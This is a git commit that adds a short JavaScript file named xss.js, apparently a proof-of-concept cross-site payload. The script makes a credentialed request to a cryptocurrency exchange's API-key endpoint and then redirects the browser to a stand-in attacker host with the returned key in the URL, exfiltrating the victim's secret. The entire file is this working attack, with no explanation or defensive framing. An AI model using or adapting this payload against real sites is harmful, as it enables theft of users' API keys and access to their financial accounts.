e33d4e88b55b47e11d82d870e483b9c8e19607bb
jvstmer <57935669+jvstmer@users.noreply.github.com>
2022-06-18 15:39:43 -0500

    Create xss.js

---
+++ airbnb.com/xss.js
@@ -0,0 +1,9 @@
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get','https://btc-exchange/api/requestApiKey',true);
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+    location='//atttacker.net/log?key='+this.responseText;
+};
